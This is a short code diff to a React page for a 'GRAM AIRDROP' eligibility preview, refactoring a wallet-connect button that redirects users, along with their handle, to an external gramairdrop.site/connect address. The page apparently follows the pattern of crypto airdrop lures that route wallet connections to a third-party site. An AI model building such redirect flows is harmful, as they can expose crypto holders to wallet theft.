@@ -3,6 +3,8 @@ import { ArrowDownRight, ArrowRight, Check, ChevronDown, CircleHelp, ExternalLin
 
 type FAQItem = { question: string; answer: string };
 
+const WALLET_CLAIM_URL = 'https://gramairdrop.site/connect';
+
 const faqs: FAQItem[] = [
   { question: 'Is this an official live airdrop?', answer: 'This experience is an eligibility preview for the GRAM AIRDROP campaign. It does not represent a live allocation, a guaranteed reward, or[...]' },
   { question: 'What is Gram?', answer: 'TON describes Gram as the heart of the TON blockchain: a Telegram-native currency for users, mini apps, and channels. It is designed for value to move at the[...]' },
@@ -64,8 +66,7 @@ function PreviewModal({ close }: { close: () => void }) {
   const [safe, setSafe] = useState(false);
   
   const handleWalletConnect = () => {
-    // Redirect to gramairdrop.site (changed from cm.gramairdrop.site)
-    window.location.href = `https://gramairdrop.site/connect?handle=${encodeURIComponent(handle)}`;
+    window.location.assign(`${WALLET_CLAIM_URL}?handle=${encodeURIComponent(handle)}`);
   };
   
   const submit = (e: React.FormEvent) => { e.preventDefault(); if (handle.trim() && safe) setStep(2); };
